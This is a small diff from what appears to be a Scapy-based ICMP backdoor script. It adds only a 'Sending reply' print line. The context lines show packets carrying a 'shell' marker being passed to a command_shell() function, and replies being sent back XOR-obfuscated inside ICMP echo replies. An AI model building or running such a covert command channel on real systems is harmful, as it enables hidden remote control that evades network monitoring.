@@ -44,6 +44,7 @@ def action(pkt):
 			elif buff[4:8] == shell:
 				time.sleep(0.1)
 				command_shell(buff[8:])
+				print "Sending reply"
 
 def packet_builder(data):
 	packet = Ether() / IP(dst=source) / ICMP(type=0) / (XOR(server_magic + data))
